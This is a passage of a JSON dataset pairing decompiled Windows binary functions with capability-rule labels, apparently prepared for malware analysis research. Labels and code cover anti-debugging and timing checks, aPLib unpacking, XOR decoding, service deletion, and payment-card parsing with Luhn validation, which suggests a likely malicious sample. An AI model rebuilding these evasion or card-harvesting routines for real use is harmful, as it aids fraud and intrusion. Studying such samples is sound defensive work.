CONCAT11(uVar19, uVar16)));\n            fcn.00401000(str.U__, 0xd, 0x422224, 9);\n            fcn.00401000(str.U__, 0xd, 0x422230, 0x16);\n            fcn.00401000(str.U__, 0xd, 0x422248, 7);\n            return;\n        }\n    }\n    uVar19 = 0;\n    uVar20 = 0;\n    uVar16 = 4;\n    Var15 = 0x4222;\n    uVar17 = 0xd;\n    uVar9 = 0x20;\n    Var14 = 0;\n    iVar5 = extraout_ECX;\n    goto code_r0x00402487;\n}\n",
        "token_count": 2112
    },
    "004027c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004027c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401a80();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404c00();\n        arg_ch_01 = fcn.00404c00();\n        arg_ch_02 = fcn.00404c00();\n        fcn.00404750(arg_10h, arg_ch_00);\n        fcn.00404750(arg_8h, arg_ch_01);\n        fcn.00404750(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x421ee8, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404dc0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, str.L4oV, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404dc0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, str.L4oV, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404dc0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404750(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 614
    },
    "00403860": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403860(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00401c20();\n        fcn.004036a0();\n        fcn.00403190();\n        if (*0x42237c == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403d50();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 161
    },
    "00403920": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a3f) overlaps instruction at (ram,0x00403a3b)\n// \n\nuint fcn.00403920(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char cVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t unaff_EDI;\n    uint *puVar9;\n    bool bVar10;\n    uint8_t uVar11;\n    bool bVar12;\n    char cVar13;\n    char cVar14;\n    float10 extraout_ST0;\n    ulong uVar15;\n    uint in_stack_ffffffac;\n    uint uVar16;\n    uchar uStack40;\n    uint uStack39;\n    uint *puStack8;\n    \n    uVar15 = fcn.00403ca0(param_5, param_6, 0x421f18, 7);\n    uVar16 = uVar15 >> 0x20;\n    puVar9 = uVar15;\n    puStack8 = puVar9;\n    if (puVar9 != NULL) {\n        if ((-1 < puVar9) && (-1 >= puVar9)) {\n            *(unaff_EDI + 0x1c) = extraout_ST0;\n        }\n        pcVar3 = _sym.imp.MSVCRT.dll_rand;\n        uVar4 = 0;\n        uStack40 = 0;\n        puVar8 = &stack0xffffffd9;\n        for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        bVar10 = false;\n        uVar7 = 0;\n        bVar12 = true;\n        do {\n            if ((bVar10 || bVar12) || (!bVar10 && !bVar12)) {\n                uVar15 = (*pcVar3)();\n            }\n            else {\n                piVar1 = pcVar3 + -1;\n                *piVar1 = *piVar1 - &stack0xffffffd0;\n                uVar15 = CONCAT44(uVar16, uVar4 & 0xffffff00 | *(puVar9 + (uVar4 & 0xff)));\n            }\n            uVar16 = uVar15 >> 0x20;\n            uVar4 = uVar15 & 0x800000ff;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xffffff00) + 1;\n            }\n            (&stack0xffffffd8)[uVar7] = uVar4;\n            uVar7 = uVar7 + 1;\n            bVar10 = uVar7 < 0x20;\n            bVar12 = uVar7 == 0x20;\n        } while (bVar10);\n        puVar8 = &stack0xffffffd8;\n        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar9 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        cVar6 = uVar15 >> 0x28;\n        uVar11 = 0;\n        cVar14 = '\\0';\n        cVar13 = cVar6 < '\\0';\n        bVar10 = cVar6 == '\\0';\n        uVar16 = 0x403a31;\n        uVar15 = fcn.004018d0(param_1, param_2, param_3, param_4, &stack0xffffffd8, 0x20, puStack8);\n        if ((bVar10 || cVar14 != cVar13) || (!bVar10 && cVar14 == cVar13)) {\n            in_stack_ffffffac = param_5;\n            uVar16 = param_6;\n            uVar15 = CONCAT44(param_6, param_5);\n        }\n        pcVar2 = (uVar15 >> 0x20) + 0x50;\n        *pcVar2 = (*pcVar2 - (uVar15 >> 0x20)) - (uVar15 < 0x8b || uVar15 + 0x75 < uVar11);\n        fcn.00404620(in_stack_ffffffac, uVar16);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1058
    },
    "00404080": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404143) overlaps instruction at (ram,0x0040413f)\n// \n\nuint __cdecl fcn.00404080(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    code *pcVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    int32_t unaff_EBX;\n    uint *puVar12;\n    uint unaff_ESI;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t unaff_EDI;\n    uint *puVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    bool bVar17;\n    bool bVar18;\n    float10 in_ST0;\n    unkbyte6 Var19;\n    uchar uStack17;\n    ushort uStack16;\n    ushort uStack14;\n    uint var_4h;\n    \n    uStack16 = unaff_ESI;\n    uStack14 = unaff_ESI >> 0x10;\n    uStack17 = unaff_EDI >> 0x18;\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    bVar17 = SCARRY4(arg_8h[0xf], arg_8h);\n    piVar4 = arg_8h[0xf] + arg_8h;\n    if ((bVar17 == piVar4 < 0) && (bVar17 != piVar4 < 0)) {\n        *arg_8h = *arg_8h + arg_8h;\n        bVar17 = *arg_8h == '\\0';\n        piVar5 = arg_8h;\n        arg_8h = piVar4;\n    }\n    else {\n        bVar17 = *piVar4 == 0x4550;\n        piVar5 = piVar4;\n    }\n    if (bVar17) {\n        bVar18 = false;\n        bVar16 = piVar5[0x16] < 0;\n        bVar17 = piVar5[0x16] != 0;\n        if (bVar17) {\n            return 0;\n        }\n        if ((bVar17) && (!bVar17)) {\n            in_ST0 = *0x7a96ed64 - in_ST0;\n            bVar18 = SBORROW4(&uStack16, 1);\n            bVar16 = &uStack17 < 0;\n        }\n        if ((bVar18 == bVar16) && (bVar18 != bVar16)) {\n            *(piVar5 + -0x1f3a4905) = in_ST0;\n            uVar3 = piVar5 + -1;\n            uVar1 = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = uVar3 + uVar1 * '\\x06';\n            uVar3 = uVar3 + (0x90 < (uVar3 & 0xf0) | uVar1 * (0xf9 < uVar3)) * '`';\n            pcVar2 = piVar5 + -1 & 0xffffff00 | uVar3;\n            *arg_8h = *arg_8h + 0x7a81df84;\n            *pcVar2 = *pcVar2 + uVar3;\n            *(unaff_EDI + 9) = *(unaff_EDI + 9) + (arg_8h >> 8);\n        }\n        else {\n            uVar11 = arg_8h[0xf];\n            if (0x80 < arg_8h[0xf]) {\n                if ((0x7f < uVar11) && (uVar11 < 0x80)) {\n                    *arg_8h = *arg_8h;\n                    *(unaff_EBX + 6) = *(unaff_EBX + 6) + (piVar5 >> 8);\n                }\n                uVar11 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n                puVar15 = *(uVar11 - 4);\n                Var19 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n                puVar8 = Var19;\n                if (puVar8 != NULL) {\n                    uVar6 = Var19 >> 0x20;\n                    bVar17 = puVar15 == NULL;\n                    puVar12 = puVar8;\n                    puVar13 = NULL;\n                    if (!bVar17) {\n                        do {\n                            if ((bVar17) || (!bVar17)) {\n                                pcVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n                            }\n                            else {\n                                uVar10 = in(uVar6);\n                                *puVar15 = uVar10;\n                                if (&uStack17 < 1) {\n                                    uStack17 = 1;\n                                    uStack16 = 0xf;\n                                    iVar9 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n                                    *(uVar11 + 0xc) = iVar9;\n                                    if (iVar9 != 0) {\n                                        uVar10 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n                                        *(uVar11 + 8) = uVar10;\n                                        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(*(uVar11 + 0xc));\n                                        return *(uVar11 + 8);\n                                    }\n                                    return 0;\n                                }\n                                uVar6 = puVar8 ^ 0xdee0ed6d;\n                                puVar12 = puVar12 & 0xffff00ff;\n                                pcVar7 = sym.imp.MSVCRT.dll_rand + (uVar6 & 0xffff0000 | uVar6 + (uVar6 >> 8) * -0x31);\n                                puVar15 = puVar15 + 1;\n                            }\n                            puVar8 = pcVar7 / 0xff;\n                            uVar6 = pcVar7 % 0xff;\n                            puVar14 = puVar13 + 1;\n                            bVar17 = puVar14 == puVar15;\n                            *(puVar13 + puVar12) = uVar6;\n                            puVar13 = puVar14;\n                        } while (puVar14 < puVar15);\n                    }\n                    puVar8 = *(uVar11 + 8) + 0x80;\n                    for (uVar6 = puVar15 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar8 = *puVar12;\n                        puVar12 = puVar12 + 1;\n                        puVar8 = puVar8 + 1;\n                    }\n                    for (uVar11 = puVar15 & 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n                        *puVar8 = *puVar12;\n                        puVar12 = puVar12 + 1;\n                        puVar8 = puVar8 + 1;\n                    }\n                    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n                    return 1;\n                }\n                return 0;\n            }\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1623
    },
    "00404300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404300(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403860;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x421ed0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00404500": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404573) overlaps instruction at (ram,0x00404571)\n// \n// WARNING: Removing unreachable block (ram,0x0040455c)\n\nuint fcn.00404500(void)\n\n{\n    char **ppcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    char cVar5;\n    int32_t unaff_EBX;\n    char **ppcVar6;\n    char cVar7;\n    char cVar8;\n    ulong uVar9;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x421fc8);\n    ppcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    cVar5 = unaff_EBX >> 8;\n    cVar8 = SCARRY1(cVar5, '0');\n    cVar7 = cVar5 + '0' < '\\0';\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, str.___X);\n    ppcVar6 = ppcVar1;\n    *0x422388 = pcVar3;\n    if ((cVar8 == cVar7) && (cVar8 != cVar7)) {\n        out(0xc4, pcVar3);\n        ppcVar6 = ppcVar1 + 1;\n        *ppcVar1 = pcVar3;\n        cVar8 = SBORROW1(cVar5, *pcVar3);\n        cVar7 = cVar5 - *pcVar3 < '\\0';\n    }\n    uVar9 = (*ppcVar6)(iVar2, str.__AL);\n    uVar4 = uVar9 >> 0x20;\n    *0x42238c = uVar9;\n    if ((cVar8 == cVar7) && (cVar8 != cVar7)) {\n        *(iVar2 + -1) = *(iVar2 + -1) + uVar9;\n        *0x422390 = uVar4 & 0xffffff00 | *(unaff_EBX + (uVar4 & 0xff));\n    }\n    else {\n        *0x422390 = (*ppcVar6)(iVar2, str.___M);\n    }\n    if (((*0x422388 != NULL) && (*0x42238c != 0)) && (*0x422390 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 559
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401042) overlaps instruction at (ram,0x0040103e)\n// \n\nvoid __cdecl fcn.00401000(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t *in_EDX;\n    uint16_t unaff_BX;\n    uint16_t uVar6;\n    int32_t iVar7;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar7 = 0;\n    if (0 < arg_14h) {\n        do {\n            uVar6 = unaff_BX & 0xff00 | unaff_BX - 0x12;\n            uVar5 = in_EDX;\n            uVar4 = *(iVar7 + arg_10h);\n            if ((uVar6 < uVar5) || (iVar2 = arg_14h,  uVar5 <= uVar6)) {\n                iVar2 = iVar7;\n            }\n            *(iVar2 + -0x7ce92414) = in_ST0;\n            uVar3 = iVar2 - 1;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar1 = uVar3 + in_AF * '\\x06';\n            *in_EDX = *in_EDX + -0x3974207c;\n            in_EDX = CONCAT44((uVar3 >> 8) >> 0x17, \n                              uVar3 & 0xffffff00 |\n                              uVar1 + (0x90 < (uVar1 & 0xf0) | uVar6 < uVar5 | in_AF * (0xf9 < uVar1)) * '`') % arg_ch;\n            uVar4 = uVar4 ^ *(in_EDX + arg_8h);\n            unaff_BX = unaff_BX & 0xff00 | uVar4;\n            *(iVar7 + arg_10h) = arg_14h ^ uVar4;\n            iVar7 = iVar7 + 1;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        } while (iVar7 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "004015e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015e0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00401a80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00401a80(void)\n\n{\n    uint uVar1;\n    \n    if (*0x422378 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x422378 = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00401ae0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b46) overlaps instruction at (ram,0x00401b41)\n// \n\nuint fcn.00401ae0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint8_t extraout_CH;\n    bool bVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    bVar2 = (POPCOUNT(extraout_CH & uVar1 ^ 6) & 1U) == 0;\n    fcn.00404230(uVar1, param_1);\n    if (!bVar2) {\n        uVar1 = param_1;\n        if (bVar2) goto code_r0x00401b39;\n    }\n    uVar1 = param_2;\ncode_r0x00401b39:\n    uVar1 = fcn.004045b0(0x34a96cf4, param_1, uVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x34a96cf4);\n    return uVar1;\n}\n",
        "token_count": 257
    },
    "00402b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402b50(uint hWnd)\n\n{\n    code **ppcVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    uint *in_FS_OFFSET;\n    bool bVar13;\n    uchar auStackY948 [228];\n    uchar *puStack620;\n    char *pcStack616;\n    uint uStack612;\n    uint uStack608;\n    uint var_24ch;\n    uint var_147h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint lpdwResult;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    puVar12 = &stack0xfffffffc;\n    var_4h = 0xffffffff;\n    uStack12 = 0x4051a0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00402b50::var_ch;\n    uStack608 = 0;\n    uStack612 = 0x402b7a;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    uStack612 = 0x4222bc;\n    pcStack616 = 0x402b85;\n    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    bVar13 = iVar4 == 0;\n    if (bVar13) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    pcStack616 = str.__nlz;\n    puStack620 = 0x402baf;\n    uVar5 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    puVar11 = &stack0xfffffffc;\n    if ((!bVar13) && (puVar11 = &stack0xfffffffc,  bVar13)) {\n        puVar10 = &stack0xfffffd94;\n        puVar11 = &stack0xfffffd94;\n        puStack620 = &stack0xfffffffc;\n        cVar3 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar12;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    puStack620 = puVar11 + -0x18;\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(*(puVar11 + 8), uVar5, 0, 0, 2, 1000);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, str._YW);\n    if (pcVar6 == NULL) {\n        *in_FS_OFFSET = *(puVar11 + -0xc);\n        return 1;\n    }\n    *(puVar11 + -0x20) = 0;\n    *(puVar11 + -4) = 0;\n    iVar7 = (*pcVar6)(*(puVar11 + -0x18), str._D_3, 0, puVar11 + -0x20);\n    piVar8 = *(puVar11 + -0x20);\n    if ((iVar7 < 0) || (piVar8 == NULL)) {\n        *(puVar11 + -4) = 0xffffffff;\n        if (piVar8 != NULL) {\n            (**(*piVar8 + 8))(piVar8);\n        }\n    }\n    else {\n        *(puVar11 + -0x24) = 0;\n        iVar7 = *piVar8;\n        puVar11[-4] = 1;\n        iVar7 = (**(iVar7 + 0x20))(piVar8, puVar11 + -0x24);\n        piVar8 = *(puVar11 + -0x24);\n        if ((iVar7 < 0) || (piVar8 == NULL)) {\n            puVar11[-4] = 0;\n            if (piVar8 != NULL) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n            piVar8 = *(puVar11 + -0x20);\n            *(puVar11 + -4) = 0xffffffff;\n            if (piVar8 != NULL) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n        }\n        else {\n            *(puVar11 + -0x1c) = 0;\n            (**(*piVar8 + 0x24))(piVar8, puVar11 + -0x1c);\n            *(puVar11 + -0x40) = 0;\n            if (0 < *(puVar11 + -0x1c)) {\n                do {\n                    iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n                    iVar7 = iVar7 % *(puVar11 + -0x1c);\n                    *(puVar11 + -0x34) = 3;\n                    *(puVar11 + -0x2c) = iVar7;\n                    *(puVar11 + 8) = 0;\n                    *(puVar11 + -0x10) = 0;\n                    iVar4 = **(puVar11 + -0x24);\n                    puVar11[-4] = 4;\n                    iVar7 = (**(iVar4 + 0x2c))(*(puVar11 + -0x24), *(puVar11 + -0x34), *(puVar11 + -0x30), iVar7, \n                                               *(puVar11 + -0x28), *(puVar11 + -0x34), *(puVar11 + -0x30), iVar7, \n                                               *(puVar11 + -0x28), puVar11 + 8);\n                    piVar8 = *(puVar11 + 8);\n                    if ((iVar7 < 0) || (piVar8 == NULL)) {\n                        piVar2 = *(puVar11 + -0x10);\n                        puVar11[-4] = 3;\n                        if (piVar2 != NULL) {\n                            (**(*piVar2 + 8))(piVar2);\n                            piVar8 = *(puVar11 + 8);\n                        }\n                        puVar11[-4] = 2;\njoined_r0x00402f66:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\ncode_r0x00402f72:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar11 + -0x34);\n                        break;\n                    }\n                    iVar7 = (***piVar8)(piVar8, 0x4061b0, puVar11 + -0x10);\n                    piVar8 = *(puVar11 + -0x10);\n                    if ((iVar7 < 0) || (piVar8 == NULL)) {\n                        puVar11[-4] = 3;\njoined_r0x00402f2d:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        piVar8 = *(puVar11 + 8);\n                        puVar11[-4] = 2;\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        goto code_r0x00402f72;\n                    }\n                    iVar7 = (**(*piVar8 + 0x38))(piVar8, puVar11 + -0x38);\n                    if (iVar7 < 0) {\ncode_r0x00402eee:\n                        piVar8 = *(puVar11 + -0x10);\n                        puVar11[-4] = 3;\n                        goto joined_r0x00402f2d;\n                    }\n                    if (*(puVar11 + -0x38) == 0) {\n                        piVar8 = *(puVar11 + -0x10);\n                        puVar11[-4] = 3;\njoined_r0x00402d69:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        piVar8 = *(puVar11 + 8);\n                        puVar11[-4] = 2;\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    else {\n                        fcn.00402940(*(puVar11 + -0x38), puVar11 + -0x24c, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(puVar11 + -0x38));\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar11 + -0x24c, 0x4222f0);\n                        if (iVar4 != 0) {\n                            piVar8 = *(puVar11 + -0x10);\n                            puVar11[-4] = 3;\n                            goto joined_r0x00402d69;\n                        }\n                        *(puVar11 + -0x14) = 0;\n                        ppcVar1 = **(puVar11 + 8);\n                        puVar11[-4] = 5;\n                        iVar7 = (**ppcVar1)(*(puVar11 + 8), 0x4061a0, puVar11 + -0x14);\n                        piVar8 = *(puVar11 + -0x14);\n                        if ((iVar7 < 0) || (piVar8 == NULL)) {\n                            puVar11[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + -0x10);\n                            puVar11[-4] = 3;\njoined_r0x00402f12:\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + 8);\n                            puVar11[-4] = 2;\n                            goto joined_r0x00402f66;\n                        }\n                        iVar7 = (**(*piVar8 + 0x20))(piVar8, puVar11 + -0x3c);\n                        if (iVar7 < 0) {\n                            piVar8 = *(puVar11 + -0x14);\n                            puVar11[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + -0x10);\n                            puVar11[-4] = 3;\n                            goto joined_r0x00402f12;\n                        }\n                        iVar4 = *(puVar11 + -0x3c);\n                        if (iVar4 == 0) {\n                            piVar8 = *(puVar11 + -0x14);\n                            puVar11[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + -0x10);\n                            puVar11[-4] = 3;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + 8);\n                            puVar11[-4] = 2;\n                        }\n                        else {\n                            puVar11[-0x148] = 0;\n                            puVar12 = puVar11 + -0x147;\n                            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            *puVar12 = 0;\n                            *(puVar12 + 2) = 0;\n                            fcn.00402940(iVar4, puVar11 + -0x148, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(puVar11 + -0x3c));\n                            iVar4 = fcn.00402a70(puVar11 + -0x148);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(**(puVar11 + -0x10) + 0x114))(*(puVar11 + -0x10));\n                                piVar8 = *(puVar11 + -0x14);\n                                puVar11[-4] = 4;\n                                if (piVar8 != NULL) {\n                                    (**(*piVar8 + 8))(piVar8);\n                                }\n                                goto code_r0x00402eee;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            piVar8 = *(puVar11 + -0x14);\n                            puVar11[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + -0x10);\n                            puVar11[-4] = 3;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar11 + 8);\n                            puVar11[-4] = 2;\n                        }\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar11 + -0x34);\n                    iVar4 = *(puVar11 + -0x40);\n                    *(puVar11 + -0x40) = iVar4 + 1;\n                } while (iVar4 + 1 < *(puVar11 + -0x1c));\n            }\n            piVar8 = *(puVar11 + -0x24);\n            puVar11[-4] = 0;\n            if (piVar8 != NULL) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n            piVar8 = *(puVar11 + -0x20);\n            *(puVar11 + -4) = 0xffffffff;\n            if (piVar8 != NULL) {\n                (**(*piVar8 